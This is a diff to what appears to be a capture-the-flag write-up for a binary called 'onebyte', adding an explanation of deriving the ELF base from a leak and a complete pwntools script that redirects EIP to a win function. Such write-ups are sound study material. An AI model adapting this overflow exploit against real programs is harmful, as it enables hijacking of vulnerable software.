@@ -139,3 +139,79 @@ Doing that I got the position to be the first 4 bytes of our input
 ```python
 'A'*4 + 'B'*4 + 'C'*4 + 'D'*4 + 'D'
 ```
+
+Cool so now instead of the EIP should be filled with A's we can fill it with the win function address 😎
+
+About the win function address how do we get it since it will always change when the program runs??
+
+Well come to think of it we were given an ELF section leak
+
+Meaning that we can calculate the elf base address via that leak
+
+When I check vmmap I get the start address of the elf binary
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/af66b8d3-8b71-4b87-8594-88cc990cde46)
+
+The idea I usually use in calculating leaks is this:
+
+```
+leak - (known leak - elf base)
+```
+
+That basically will just subtract the leak with the offset to the elf base address
+
+Now that we know that here's my solve script:
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+from warnings import filterwarnings
+filterwarnings('ignore')
+
+context.update(arch='i386')
+exe = './onebyte'
+elf = context.binary = ELF(exe, checksec=False)
+context.log_level = 'debug'
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.GDB:
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+gdbscript = '''
+init-pwndbg
+piebase
+break *main+110
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+io = start()
+
+io.recvuntil('Free junk:')
+init = int(io.recvline().strip().decode(), 16)
+elf.address = init - (0x565561bd - 0x56555000)
+log.info("Elf base address: 0x%x", elf.address)
+log.info("Jumping to address: 0x%x", elf.sym['win'])
+
+payload = p32(elf.sym['win']) + b'A'*4 + b'C'*4 + b'D'*4 + b'D'
+
+io.recvuntil('Your turn:')
+io.send(payload)
+
+io.interactive()
+```
+
+But when I ran it uhmmm it works and fails 
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/754a5f54-5a6d-43b8-8981-14488dded912)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2ac246c9-f9cc-4d68-8476-6669eaf7b6a9)
+
+
+
+
+
